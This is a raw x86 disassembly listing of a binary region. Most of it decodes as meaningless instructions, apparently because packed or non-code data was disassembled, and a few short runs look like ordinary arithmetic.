  4104b2:	cmp    DWORD PTR [ebp+0x1c998f0],ebp
  4104b8:	enter  0x59e5,0x72
  4104bc:	xor    ebp,ebx
  4104be:	ficom  WORD PTR [ecx]
  4104c0:	xor    eax,0x41646b00
  4104c5:	aas    
  4104c6:	cs push eax
  4104c8:	bnd ret 0xb47b
  4104cc:	xchg   BYTE PTR [esi+0x7ee0e974],bl
  4104d2:	stc    
  4104d3:	jae    0x410510
  4104d5:	aad    0x42
  4104d7:	push   es
  4104d8:	xchg   BYTE PTR [eax-0x1b476e2],bh
  4104de:	pop    ebx
  4104df:	les    edx,FWORD PTR [esi-0x51291bd3]
  4104e5:	outs   dx,BYTE PTR ds:[esi]
  4104e6:	xchg   edx,eax
  4104e7:	mov    al,ds:0x72d46f7a
  4104ec:	mov    esp,0x49ca94e7
  4104f1:	lods   al,BYTE PTR ds:[esi]
  4104f2:	jnp    0x410524
  4104f4:	jmp    FWORD PTR [ecx-0x1e]
  4104f7:	xchg   esi,eax
  4104f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104f9:	sub    dh,ch
  4104fb:	inc    ebp
  4104fc:	dec    ecx
  4104fd:	sub    ch,BYTE PTR [eax]
  4104ff:	test   ah,bh
  410501:	jmp    0x4104d7
  410503:	stc    
  410504:	and    al,BYTE PTR [edi-0x1f]
  410507:	pop    ecx
  410508:	outs   dx,DWORD PTR ds:[esi]
  410509:	imul   ebp,DWORD PTR [eax-0x37],0xffffffee
  41050d:	ds inc edi
  41050f:	mov    ds:0x1bc9e045,eax
  410514:	sub    BYTE PTR [eax+edi*1],dh
  410517:	mov    ds:0x23f290d2,eax
  41051c:	scas   al,BYTE PTR es:[edi]
  41051d:	and    BYTE PTR [eax-0x38ca79fa],bl
  410523:	or     BYTE PTR [eax+0x27],bl
  410526:	xchg   esp,eax
  410527:	adc    esp,ebx
  410529:	out    0xfb,al
  41052b:	addr16 pop eax
  41052d:	mov    ds:0xf4b60241,eax
  410532:	in     al,dx
  410533:	push   es
  410534:	repz arpl WORD PTR [ebx+ecx*1-0x55],bp
  410539:	in     eax,dx
  41053a:	in     eax,dx
  41053b:	imul   esi,DWORD PTR [edx+0x6f],0xbec9999c
  410542:	bound  edi,QWORD PTR [esi-0x6b]
  410545:	out    0x2a,al
  410547:	mov    bl,0xfa
  410549:	jbe    0x4105b3
  41054b:	in     eax,0x4b
  41054d:	shl    BYTE PTR [edi+0x536b3ea1],0xf1
  410554:	aas    
  410555:	lahf   
  410556:	jo     0x41056c
  410558:	les    esi,FWORD PTR [esi+0x30]
  41055b:	aam    0x2f
  41055d:	out    dx,eax
  41055e:	or     cl,BYTE PTR [eax+0x2a]
  410561:	shl    edx,cl
  410563:	push   ecx
  410564:	inc    ebp
  410565:	nop
  410566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410567:	arpl   di,di
  410569:	xchg   edx,eax
  41056a:	sub    BYTE PTR [ecx+0x62],ch
  41056d:	dec    ebx
  41056e:	dec    ebp
  41056f:	adc    BYTE PTR [eax+0x7d],bl
  410572:	gs cmp esp,DWORD PTR ss:[ebx]
  410576:	mov    ch,BYTE PTR [edi]
  410578:	(bad)  
  410579:	push   eax
  41057a:	and    al,0x34
  41057c:	fndisi(8087 only) 
  41057e:	push   esi
  41057f:	xor    ebx,DWORD PTR [ebx-0x46]
  410582:	cmp    al,0x62
  410584:	push   es
  410585:	jmp    0xf1a1:0xc7ce8a6e
  41058c:	ss mov bh,0xfd
  41058f:	adc    cl,BYTE PTR [esi+0x41]
  410592:	retf   0xb6b2
  410595:	dec    BYTE PTR [ecx]
  410597:	sub    BYTE PTR [ecx+0x6d],ch
  41059a:	retf   
  41059b:	popf   
  41059c:	jb     0x4105c4
  41059e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41059f:	sbb    al,0x60
  4105a1:	imul   esp,DWORD PTR [ebp-0x5c20f721],0xffffffa8
  4105a8:	out    0x5e,al
  4105aa:	add    DWORD PTR [ecx+edx*8],edi
  4105ad:	xchg   edx,eax
  4105ae:	sbb    esi,DWORD PTR [edi+edi*1+0x5476c01e]
  4105b5:	jp     0x4105f6
  4105b7:	daa    
  4105b8:	ss push ebp
  4105ba:	mov    BYTE PTR [edi+edi*4-0x15cd87d0],0x48
  4105c2:	fiadd  DWORD PTR [esi]
  4105c4:	xchg   ecx,eax
  4105c5:	jo     0x4105ac
  4105c7:	dec    esp
  4105c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105c9:	xchg   ebp,eax
  4105ca:	sbb    DWORD PTR [esi+0x64],eax
  4105cd:	push   0xce4e0e18
  4105d2:	mov    bl,0x60
  4105d4:	ret    0x578f
  4105d7:	dec    edx
  4105d8:	popa   
  4105d9:	shl    eax,0xf8
  4105dc:	adc    BYTE PTR [edx],0x13
  4105df:	es pop ecx
  4105e1:	push   cs
  4105e2:	xor    DWORD PTR [ebp-0x45f97209],esi
  4105e8:	push   eax
  4105e9:	inc    esp
  4105ea:	imul   edi,DWORD PTR [edx-0x1e729077],0x4c629fd3
  4105f4:	jl     0x4105d4
  4105f6:	leave  
  4105f7:	push   cs
  4105f8:	adc    bh,al
  4105fa:	inc    edx
  4105fb:	cli    
  4105fc:	mov    al,ds:0x9b786b0
  410601:	pop    ss
  410602:	mov    edx,0xc9cabf94
  410607:	xor    al,0xa8
  410609:	add    eax,0x2ae7ca15
  41060e:	std    
  41060f:	cdq    
  410610:	test   eax,0xd45d8bad
  410615:	mov    ecx,DWORD PTR [ebp+0xc]
  410618:	add    esi,DWORD PTR [ecx]
  41061a:	xor    edx,0xcb79b577
  410620:	shrd   edx,eax,0x2
  410624:	xor    ecx,ecx
  410626:	shl    esi,0x1e
  410629:	xor    ecx,edi
  41062b:	shr    eax,0x2
  41062e:	or     ecx,edx
  410630:	xor    esi,0x80000000
  410636:	or     esi,eax
  410638:	mov    DWORD PTR [ebp-0x40],ecx
  41063b:	push   edi
  41063c:	mov    DWORD PTR [ebp-0x3c],esi
  41063f:	mov    eax,DWORD PTR [ebp-0x48]
  410642:	mov    ecx,DWORD PTR [ebp-0x44]
  410645:	push   0xae0404d3
  41064a:	push   ecx
  41064b:	push   eax
  41064c:	call   0x42226c
  410651:	mov    ecx,eax
  410653:	mov    eax,DWORD PTR [ebp-0x50]
  410656:	mov    esi,DWORD PTR [ebp-0x4c]
  410659:	or     ecx,eax
  41065b:	mov    eax,DWORD PTR [ebp-0x40]
  41065e:	or     edx,esi
  410660:	jmp    0x410a14
  410665:	pop    ebx
  410666:	icebp  
  410667:	lds    esp,FWORD PTR [eax+0x3abbbc68]
  41066d:	ror    ecx,0xfe
  410670:	fucom  st(3)
  410672:	jae    0x410631
  410674:	iret   
  410675:	out    dx,eax
  410676:	cmp    al,0xbe
  410678:	mov    esi,0xbebec4e3
  41067d:	jle    0x41061f
  41067f:	int3   
  410680:	ret    
  410681:	in     eax,0x15
  410683:	mov    ebp,0x7e522e8e
  410688:	cdq    
  410689:	mov    ecx,0x158af5ea
  41068e:	int3   
  41068f:	in     eax,dx
  410690:	cmc    
  410691:	pop    ss
  410692:	or     cl,BYTE PTR [edx+0x95c7298]
  410698:	inc    esp
  410699:	mov    eax,ebx
  41069b:	or     bh,BYTE PTR [ebx]
  41069d:	dec    eax
  41069e:	inc    esp
  41069f:	in     al,0x31
  4106a1:	add    eax,DWORD PTR [eax-0x3b124a59]
  4106a7:	adc    eax,0x4e38eb62
  4106ac:	bound  edx,QWORD PTR [edx+0x109d20b8]
  4106b2:	sbb    BYTE PTR gs:[ebx],dl
  4106b5:	jb     0x4106da
  4106b7:	xchg   ebp,eax
  4106b8:	fdivrp st(3),st
  4106ba:	mov    cl,0x67
  4106bc:	pop    ecx
  4106bd:	push   esi
  4106be:	iret   
  4106bf:	sub    ch,BYTE PTR [ecx]
  4106c1:	rol    BYTE PTR [edi+0x1b],cl
  4106c4:	mov    ecx,0x825978e2
  4106c9:	push   esp
  4106ca:	ret    
  4106cb:	sahf   
  4106cc:	out    0xbd,eax
  4106ce:	bswap  esi
  4106d0:	rcl    eax,1
  4106d2:	out    dx,al
  4106d3:	inc    edx
  4106d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106d5:	popa   
  4106d6:	jmp    0xd086:0x3477c8bb
  4106dd:	xchg   DWORD PTR [eax+edi*4],ebp
  4106e0:	cmp    al,0x67
  4106e2:	sahf   
  4106e3:	add    BYTE PTR [ebx+0x52178f26],0x16
  4106ea:	dec    ecx
  4106eb:	pop    esi
  4106ec:	and    cl,BYTE PTR [eax+0x40a9d41a]
  4106f2:	cld    
  4106f3:	dec    ebp
  4106f4:	ret    0x1f87
  4106f7:	push   eax
  4106f8:	(bad)  
  4106fa:	inc    ebp
  4106fb:	jg     0x410769
  4106fd:	imul   ecx,DWORD PTR [edx-0x41fd7207],0x275ebb84
  410707:	test   DWORD PTR [esi],ebx
  410709:	jae    0x41076c
  41070b:	push   dx
  41070d:	push   es
  41070e:	imul   edi
  410710:	add    bl,bl
  410712:	inc    esp
  410713:	and    al,0x66
  410715:	lods   eax,DWORD PTR ds:[esi]
  410716:	(bad)  
  410717:	bound  ecx,QWORD PTR [esi]
  410719:	cmp    eax,0x5a197eed
  41071e:	aas    
  41071f:	and    ecx,DWORD PTR ss:[edi+0x5f]
  410723:	fisttp QWORD PTR [ebp+0x4429eba2]
  410729:	ret    
  41072a:	dec    edi
  41072b:	shl    BYTE PTR [edi-0x33],1
  41072e:	cmp    DWORD PTR cs:[ecx+0x26],edi
  410732:	inc    esp
  410733:	cmp    ebx,DWORD PTR [ecx+0x4b58188c]
  410739:	xor    al,0xe5
  41073b:	fisubr WORD PTR [esi-0x54]
  41073e:	add    cl,cl
  410740:	fwait
  410741:	pop    esp
  410742:	stos   DWORD PTR es:[edi],eax
  410743:	stos   DWORD PTR es:[edi],eax
  410744:	mov    ah,0xd4
  410746:	outs   dx,BYTE PTR ds:[esi]
  410747:	sbb    al,ah
  410749:	popa   
  41074a:	pop    edx
  41074b:	add    al,0x46
  41074d:	fnsave [ecx]
  41074f:	outs   dx,BYTE PTR ds:[esi]
  410750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410751:	sbb    al,0x19
  410753:	lods   al,BYTE PTR ds:[esi]
  410754:	xchg   edi,eax
  410755:	call   0x183f:0x1e8f5af
  41075c:	pop    ds
  41075d:	call   0x6253e31d
  410762:	arpl   WORD PTR ds:0x511e8432,di
  410768:	sbb    ebp,DWORD PTR [esi-0x6d27a04]
  41076e:	es cmp eax,0x80bec65
  410774:	and    al,0xc8
  410776:	jge    0x410795
  410778:	stos   DWORD PTR es:[edi],eax
  410779:	pop    edx
  41077a:	cmp    bh,BYTE PTR [ebp+0x7f26cee9]
  410780:	sbb    eax,0x7f8ed77f
  410785:	or     eax,0x2a3cfa0f
  41078a:	or     BYTE PTR [edx-0x445b5fbb],0xfa
  410791:	imul   BYTE PTR [eax]
  410793:	xor    eax,0xe6389dce
  410798:	sub    al,0x3
  41079a:	retf   
  41079b:	(bad)  
  41079c:	jg     0x41073c
  41079e:	lock lds eax,FWORD PTR [ebp+edi*1-0x42c1c889]
  4107a6:	in     al,dx
  4107a7:	repz adc eax,0x5c6e44c1
  4107ad:	xor    al,0x79
  4107af:	sahf   
  4107b0:	das    
  4107b1:	icebp  
  4107b2:	jo     0x410770
  4107b4:	sbb    al,0xfd
  4107b6:	xchg   edx,eax
  4107b7:	fmul   DWORD PTR [esi+ebp*8]
  4107ba:	xchg   BYTE PTR [ebx-0x77a14a3b],bh
  4107c0:	test   DWORD PTR [esi],eax
  4107c2:	dec    ebx
  4107c3:	sahf   
  4107c4:	mov    DWORD PTR [esi],ebx
  4107c6:	cmp    esi,eax
  4107c8:	shr    DWORD PTR [eax+esi*4-0x39],1
  4107cc:	sub    BYTE PTR [edi-0x7b],cl
  4107cf:	sbb    al,0xbd
  4107d1:	xchg   edi,eax
  4107d2:	sub    dh,BYTE PTR [esi+0x61]
  4107d5:	je     0x410757
  4107d7:	cmp    BYTE PTR [eax-0x99a8d29],0x57
  4107de:	call   0x49bb9ef1
  4107e3:	jnp    0x41084c
  4107e5:	or     al,0xc5
  4107e7:	mov    BYTE PTR [edi],dh
  4107e9:	adc    al,0x50
  4107eb:	jo     0x4107b6
  4107ed:	inc    ecx
  4107ee:	aam    0x84
  4107f0:	test   DWORD PTR [eax-0x50],0x7a82b964
  4107f7:	mov    esi,DWORD PTR [ebx+0x46d92c6b]
  4107fd:	pop    ebp
  4107fe:	(bad)  
  4107ff:	shr    BYTE PTR [ebp+0x0],cl
  410802:	fst    DWORD PTR [ebx-0x40]
  410805:	add    BYTE PTR [ebp-0x36],bh
  410808:	sahf   
  410809:	ja     0x41082e
  41080b:	clc    
  41080c:	push   cs
  41080d:	jae    0x410790
  41080f:	out    0x70,al
  410811:	sub    eax,0x85bab30d
  410816:	pushf  
  410817:	nop
  410818:	call   0xb616:0x44e5d26c
  41081f:	ins    BYTE PTR es:[edi],dx
  410820:	inc    edx
  410821:	pop    eax
  410822:	lock ret 0x6e8a
  410826:	aaa    
  410827:	imul   edx,DWORD PTR [eax-0x50d0e0c5],0xffffffda
  41082e:	aas    
  41082f:	adc    DWORD PTR [eax],edx
  410831:	and    eax,0x476518bd
  410836:	gs sbb eax,ecx
  410839:	cdq    
  41083a:	loope  0x410899
  41083c:	scas   al,BYTE PTR es:[edi]
  41083d:	pop    edi
  41083e:	in     al,dx
  41083f:	add    edx,DWORD PTR [eax-0xe]
  410842:	or     al,0x2
  410844:	fsubrp st(0),st
  410846:	retf   
  410847:	jl     0x4107ff
  410849:	into   
  41084a:	cmp    edx,ecx
  41084c:	pushf  
  41084d:	gs test al,0x88
  410850:	xlat   BYTE PTR ds:[ebx]
  410851:	adc    eax,0x62200767
  410856:	adc    DWORD PTR [ebx+0x6b95ffdd],ecx
  41085c:	dec    esi
  41085d:	sahf   
  41085e:	dec    edx
  41085f:	xchg   esi,eax
  410860:	loop   0x410823
  410862:	mov    esi,0xda2d4b3e
  410867:	ins    BYTE PTR es:[edi],dx
  410868:	test   bh,dh
  41086a:	dec    ebx
  41086b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41086c:	or     dh,BYTE PTR [esi]
  41086e:	loope  0x4108c5
  410870:	rol    BYTE PTR [esi],cl
  410872:	mov    ah,0x4e
  410874:	mov    ch,0x3f
  410876:	in     al,dx
  410877:	mov    BYTE PTR [ebx+0x38],0x92
  41087b:	jg     0x410879
  41087d:	outs   dx,DWORD PTR ds:[esi]
  41087e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41087f:	xchg   esp,eax
  410880:	jp     0x410879
  410882:	mov    esp,0x95c444ea
  410887:	pop    edx
  410888:	mov    ecx,0x3b8c98ab
  41088d:	imul   esi,esi,0x30
  410890:	mov    ds:0x7b9fb130,al
  410895:	lock cmp DWORD PTR [edi],ecx
  410898:	es leave 
  41089a:	addr16 mov esi,0x449c511f
  4108a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108a1:	shl    BYTE PTR [esi-0x41e2595b],cl
  4108a7:	lds    esi,FWORD PTR [edi-0xb0d25f]
  4108ad:	pop    ecx
  4108ae:	and    ecx,DWORD PTR [ecx]
  4108b0:	scas   eax,DWORD PTR es:[edi]
  4108b1:	mov    dh,0x90
  4108b3:	enter  0xaae8,0x89
  4108b7:	sub    al,0xbb
  4108b9:	cmp    eax,0xea3c0689
  4108be:	jae    0x410927
  4108c0:	inc    BYTE PTR [ebp+0x29]
  4108c3:	mov    ebp,0x7375a271
  4108c8:	jp     0x4108cc
  4108ca:	jg     0x4108d3
  4108cc:	sbb    al,0x53
  4108ce:	dec    ebp
  4108cf:	jno    0x410902
  4108d1:	scas   al,BYTE PTR es:[edi]
  4108d2:	pop    ebx
  4108d3:	(bad)  
  4108d5:	sub    DWORD PTR [edx+0x30],eax
  4108d8:	pushf  
  4108d9:	xor    al,0x80
  4108db:	fmul   DWORD PTR [edx+0x75]
  4108de:	imul   edx,DWORD PTR [edx],0x36054a31
  4108e4:	mov    ebp,DWORD PTR [edi+eiz*1-0x3fcb38ec]
  4108eb:	into   
  4108ec:	repnz sub DWORD PTR [edi+0x780fa582],ecx
  4108f3:	xchg   DWORD PTR [edx-0x333cde03],esi
  4108f9:	add    DWORD PTR [edi+0x61],0x3c
  4108fd:	pop    edi
  4108fe:	cmp    eax,0xe40e7cd4
  410903:	cmp    BYTE PTR [edi],0x68
  410906:	mov    bh,0xab
  410908:	outs   dx,DWORD PTR ds:[esi]
  410909:	ret    0xc3f9
  41090c:	mov    bl,0xd8
  41090e:	fimul  DWORD PTR [edx-0x3008ccc5]
  410914:	ins    DWORD PTR es:[edi],dx
  410915:	add    DWORD PTR [edx+0x26d04d13],esi
  41091b:	cs (bad) 
  41091d:	pop    esi
  41091e:	and    DWORD PTR [edi*1+0x16fbb743],edi
  410925:	adc    ebp,ebp
  410927:	add    ah,BYTE PTR [edx-0x9333477]
  41092d:	push   ss
  41092e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41092f:	dec    esi
  410930:	fmul   QWORD PTR [ecx-0x29]
  410933:	push   ebp
  410934:	xor    BYTE PTR [ecx+0x78],0x11
  410938:	or     edx,DWORD PTR [esi+edx*1]
  41093b:	mov    ebp,0xe70919de
  410940:	jmp    0xcf9c:0xdbabd52e
  410947:	gs jae 0x410918
  41094a:	jmp    0x4109ca
  41094c:	in     eax,dx
  41094d:	inc    ebx
  41094e:	xchg   esp,eax
  41094f:	adc    ecx,ecx
  410951:	sub    esp,ebp
  410953:	in     al,0x3c
  410955:	pop    esi
  410956:	jle    0x4108ee
  410958:	and    BYTE PTR [edx+edx*2],al
  41095b:	rol    DWORD PTR [eax],1
  41095d:	ins    DWORD PTR es:[edi],dx
  41095e:	leave  
  41095f:	hlt    
  410960:	ins    DWORD PTR es:[edi],dx
  410961:	out    0x32,al
  410963:	loope  0x4109b7
  410965:	add    DWORD PTR [ecx+0x6b6e9f2a],ebp
  41096b:	jp     0x4109c5
  41096d:	out    0xc7,eax
  41096f:	jmp    0x410911
  410971:	mov    al,ds:0xc970549c
  410976:	jns    0x4109b9
  410978:	pop    es
  410979:	jnp    0x4109c3
  41097b:	push   0xf7b72e74
  410980:	push   esp
  410981:	add    esp,esp
  410983:	cmp    bl,BYTE PTR [ebx-0x2d]
  410986:	scas   eax,DWORD PTR es:[edi]
  410987:	push   ss
  410988:	fldcw  WORD PTR [edi]
  41098a:	test   al,0x2a
  41098c:	or     BYTE PTR [ebp+0x22851417],dh
  410992:	push   eax
  410993:	in     al,dx
  410994:	je     0x4109d1
  410996:	jle    0x410966
  410998:	fcmovne st,st(3)
  41099a:	mov    al,0x47
  41099c:	pop    ebx
  41099d:	adc    al,0xca
  41099f:	xor    DWORD PTR [ebx-0x26cc94a],eax
  4109a5:	add    bl,dl
  4109a7:	and    eax,0xfe4b813c
  4109ac:	xor    DWORD PTR ds:0x4a68f54a,eax
  4109b2:	jbe    0x41094e
  4109b4:	xor    BYTE PTR [edi+ebp*2-0x277127cc],bh
  4109bb:	rol    BYTE PTR [ebp-0x2],1
  4109be:	scas   eax,DWORD PTR es:[edi]
  4109bf:	xor    BYTE PTR [eax+0x72],0x5d
  4109c3:	cmp    eax,0x4290f3fb
  4109c8:	mov    ch,0x3e
  4109ca:	or     al,0x55
  4109cc:	pusha  
  4109cd:	hlt    
  4109ce:	mov    ds:0xe9b3e4b1,eax
  4109d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109d4:	fwait
  4109d5:	mov    dl,dl
  4109d7:	sbb    DWORD PTR [ebp-0x80],esi
  4109da:	xor    al,BYTE PTR [edx-0x21d299c4]
  4109e0:	push   esi
  4109e1:	scas   al,BYTE PTR es:[edi]
  4109e2:	push   ecx
  4109e3:	inc    edx
  4109e4:	adc    al,0x92
  4109e6:	pop    ebx
  4109e7:	std    
  4109e8:	cmp    al,0xcd
  4109ea:	pusha  
  4109eb:	jp     0x410a5e
  4109ed:	mov    dl,0xa4
  4109ef:	in     eax,dx
  4109f0:	idiv   BYTE PTR [ebx+0x1fc5b1fa]
  4109f6:	mov    ebp,0x9441fd1
  4109fb:	into   
  4109fc:	jo     0x4109d2
  4109fe:	mov    ebp,0x18ad8da
  410a03:	pop    edx
  410a04:	xchg   ebx,eax
  410a05:	adc    eax,0x3da9e90d
  410a0a:	xor    bl,BYTE PTR [ebp+ebx*1+0x7a]
  410a0e:	xchg   ebp,eax
  410a0f:	or     DWORD PTR [esi+0x7d],0xffffffc5
  410a13:	scas   eax,DWORD PTR es:[edi]
  410a14:	mov    esi,DWORD PTR [ebp-0x3c]
  410a17:	add    ecx,eax
  410a19:	mov    eax,DWORD PTR [ebp-0x58]
  410a1c:	adc    edx,esi
  410a1e:	mov    esi,DWORD PTR [ebp-0x54]
  410a21:	add    ecx,eax
  410a23:	mov    eax,DWORD PTR [ebp+0x8]
  410a26:	adc    edx,esi
  410a28:	add    ecx,0xffff55a8
  410a2e:	pop    edi
  410a2f:	adc    edx,0xffff64cd
  410a35:	pop    esi
  410a36:	mov    DWORD PTR [eax],ecx
  410a38:	jmp    0x410dec
  410a3d:	pop    esi
  410a3e:	sub    al,0xdf
  410a40:	shr    BYTE PTR [ebx+ebx*1+0x359fbc6e],1
  410a47:	mov    esp,0x8a2adca4
  410a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a4d:	push   ss
  410a4e:	inc    edx
  410a4f:	mov    esi,0xbec4e3be
  410a54:	mov    esi,0x91f64bdf
  410a59:	inc    ebp
  410a5a:	add    BYTE PTR [ebx+0x1228640d],al
  410a60:	push   cs
  410a61:	rcr    BYTE PTR [eax-0x70cd3e79],0x40
  410a68:	out    0x40,eax
  410a6a:	adc    dl,ah
  410a6c:	mov    ah,0x29
  410a6e:	jecxz  0x410ad6
  410a70:	sbb    BYTE PTR [edx],dh
  410a72:	(bad)  
  410a73:	in     eax,0x47
  410a75:	ins    DWORD PTR es:[edi],dx
  410a76:	dec    ecx
  410a77:	jge    0x410aac
  410a79:	rol    BYTE PTR [esi+0x79d876bc],1
  410a7f:	push   cs
  410a80:	stos   DWORD PTR es:[edi],eax
  410a81:	out    0x4f,eax
  410a83:	fisub  WORD PTR [ebx]
  410a85:	out    dx,al
  410a86:	jmp    FWORD PTR [edi+edx*2]
  410a89:	ins    BYTE PTR es:[edi],dx
  410a8a:	es loope 0x410abb
  410a8d:	fcmovne st,st(4)
  410a8f:	int    0x37
  410a91:	push   ecx
  410a92:	icebp  
  410a93:	jne    0x410a26
  410a95:	xor    al,0xf
  410a97:	xchg   ebx,eax
  410a98:	sti    
  410a99:	pop    ss
  410a9a:	fild   DWORD PTR [ebx-0x1cb91a1b]
  410aa0:	jl     0x410afd
  410aa2:	(bad)  
  410aa3:	les    ebx,FWORD PTR [esp+eax*4-0x4d]
  410aa7:	or     ebx,DWORD PTR [edi+0x2e]
  410aaa:	(bad)  
  410aab:	pop    es
  410aac:	jb     0x410aad
  410aae:	and    DWORD PTR [ebp-0x1c873871],esi
  410ab4:	push   ds
  410ab5:	fistp  QWORD PTR [ecx+0x75c2f448]
  410abb:	popf   
  410abc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410abd:	lea    eax,[edx-0x4d24988f]
  410ac3:	pop    ecx
  410ac4:	scas   eax,DWORD PTR es:[edi]
  410ac5:	bound  eax,QWORD PTR [edx+ecx*2+0x99b51ea]
  410acc:	mov    esi,0xca578abd
  410ad1:	mov    bl,0x33
  410ad3:	in     eax,0xed
  410ad5:	mov    dh,0x16
  410ad7:	iret   
  410ad8:	fnstcw WORD PTR [ebp-0x8]
  410adb:	int3   
  410adc:	jge    0x410ab7
  410ade:	into   
  410adf:	pop    edi
  410ae0:	lds    ebx,FWORD PTR [ecx+edi*4+0xb481d2]
  410ae7:	lock jmp 0x2ee9:0x2268b736
  410aef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410af0:	adc    al,BYTE PTR [ebx+0x4]
  410af3:	jns    0x410ab3
  410af5:	(bad)  
  410af6:	pop    ecx
  410af7:	loope  0x410ab5
  410af9:	cmp    DWORD PTR [esi],0xeb0988ae
  410aff:	inc    esp
  410b00:	lea    esi,[edx]
  410b02:	sub    esp,esi
  410b04:	dec    ebx
  410b05:	mov    BYTE PTR [ebp-0x6ee3e0a9],dh
  410b0b:	adc    eax,0x3be0543
  410b10:	and    BYTE PTR [ebx-0x69c8e784],0xbb
  410b17:	jae    0x410b8c
  410b19:	push   ds
  410b1a:	call   DWORD PTR [ebx]
  410b1c:	fnstsw WORD PTR [ebx]
  410b1e:	add    ebp,DWORD PTR [edx+0x13]
  410b21:	leave  
  410b22:	stos   DWORD PTR es:[edi],eax
  410b23:	push   edi
  410b24:	call   0xd5b1:0x42e053e5
  410b2b:	(bad)
  410b2e:	mov    dl,0x7f
  410b30:	dec    ebx
  410b31:	mov    ebp,eax
  410b33:	in     eax,0x84
  410b35:	pop    ds
  410b36:	xlat   BYTE PTR ds:[ebx]
  410b37:	jecxz  0x410b33
  410b39:	aas    
  410b3a:	arpl   WORD PTR [ecx+0x6fc6428c],bx
  410b40:	mov    al,ds:0xf99e6cdb
  410b45:	pop    eax
  410b46:	repnz and eax,0xd07c6752
  410b4c:	fadd   QWORD PTR [esi-0x5829ca7c]
  410b52:	les    esi,FWORD PTR [ebp-0x545df670]
  410b58:	pushf  
  410b59:	adc    al,0x1e
  410b5b:	int3   
  410b5c:	rol    BYTE PTR [esi+edx*2],cl
  410b5f:	jno    0x410b38
  410b61:	out    0x11,eax
  410b63:	dec    esp
  410b64:	test   edx,edx
  410b66:	sbb    ecx,edi
  410b68:	sahf   
  410b69:	je     0x410b3f
  410b6b:	add    al,ah
  410b6d:	lods   al,BYTE PTR ds:[esi]
  410b6e:	xchg   edx,ecx
  410b70:	adc    DWORD PTR [edx+ecx*8],0xca701610
  410b77:	out    0x3c,eax
  410b79:	ins    DWORD PTR es:[edi],dx
  410b7a:	jns    0x410b18
  410b7c:	fisttp QWORD PTR [edi-0x2c9b021b]
  410b82:	push   edx
  410b83:	sub    eax,0x2e600b04
  410b88:	xlat   BYTE PTR ds:[ebx]
  410b89:	pop    esi
  410b8a:	adc    dl,BYTE PTR [ecx-0x4a54a324]
  410b90:	mov    BYTE PTR [ebx-0x39],cl
  410b93:	jmp    0xd7ab:0x34a913e8
  410b9a:	ins    BYTE PTR es:[edi],dx
  410b9b:	sbb    al,0x99
  410b9d:	or     BYTE PTR [ecx+0x1cdb2ef9],ah
  410ba3:	mov    cl,BYTE PTR es:[ebx]
  410ba6:	jo     0x410bd0
  410ba8:	push   edi
  410ba9:	fisttp DWORD PTR [ebx]
  410bab:	inc    esp
  410bac:	ss cli 
  410bae:	jl     0x410c1d
  410bb0:	push   ss
  410bb1:	mov    BYTE PTR [ecx+eiz*4],cl
  410bb4:	mov    ds:0x745abc8c,al
  410bb9:	cmp    edi,ebp
  410bbb:	pop    edx
  410bbc:	bnd jbe 0x410b66
  410bbf:	mov    WORD PTR [ebp+0x11ad6683],gs
  410bc5:	mov    BYTE PTR [ecx],cl
  410bc7:	js     0x410c1c
  410bc9:	jecxz  0x410c22
  410bcb:	mov    ebp,0x5f9b24b5
  410bd0:	fisttp WORD PTR [eax]
  410bd2:	int3   
  410bd3:	retf   0x96c0
  410bd6:	mov    eax,0xf7cfc943
  410bdb:	jmp    0xef3f832d
  410be0:	mov    esp,0x2ac0ca96
  410be5:	ss cli 
  410be7:	mov    ch,0x2f
  410be9:	mov    ecx,0x5b0337f6
  410bee:	mov    ecx,0x9803b3c2
  410bf3:	dec    ecx
  410bf4:	push   esi
  410bf5:	(bad)  
  410bf6:	ret    
  410bf7:	inc    eax
  410bf8:	jecxz  0x410b87
  410bfa:	inc    edx
  410bfb:	dec    ebp
  410bfc:	dec    eax
  410bfd:	inc    esp
  410bfe:	out    dx,al
  410bff:	lods   al,BYTE PTR ds:[esi]
  410c00:	or     DWORD PTR [ebx+eax*2+0x49143080],0x820bc571
  410c0b:	or     eax,0x1f829307
  410c10:	xor    ah,bl
  410c12:	push   ecx
  410c13:	mov    cl,0x6f
  410c15:	aas    
  410c16:	add    cl,BYTE PTR [ebp+0x27c41217]
  410c1c:	dec    ebx
  410c1d:	mov    dh,0x29
  410c1f:	xchg   esi,eax
  410c20:	jl     0x410c53
  410c22:	push   0x44a747c6
  410c27:	add    BYTE PTR [edi+0x4a],bl
  410c2a:	enter  0xbcf6,0x7
  410c2e:	popa   
  410c2f:	push   edx
  410c30:	loop   0x410cad
  410c32:	and    al,0x38
  410c34:	add    ebp,esp
  410c36:	icebp  
  410c37:	lods   al,BYTE PTR ds:[esi]
  410c38:	(bad)  
  410c39:	push   ebp
  410c3a:	mov    cl,0xbd
  410c3c:	jb     0x410c1c
  410c3e:	dec    esp
  410c3f:	jmp    0x8a77:0xbf79a2b3
  410c46:	jg     0x410bfa
  410c48:	(bad)  
  410c49:	and    BYTE PTR [eax-0x5],bl
  410c4c:	ja     0x410c8c
  410c4e:	cmovbe eax,DWORD PTR [edi-0xa]
  410c52:	data16 xchg BYTE PTR [edx+ecx*4-0x30976c20],dl
  410c5a:	push   ebx
  410c5b:	mov    al,ds:0xaf2f95c7
  410c60:	out    0xeb,al
  410c62:	xchg   bl,dl
  410c64:	push   esp
  410c65:	jb     0x410c63
  410c67:	pop    ss
  410c68:	jle    0x410cd2
  410c6a:	pop    edx
  410c6b:	sbb    DWORD PTR [ebp+0x77],0x13d027d8
  410c72:	sbb    ecx,0x24c8a57d
  410c78:	rcr    DWORD PTR [edi],1
  410c7a:	cwde   
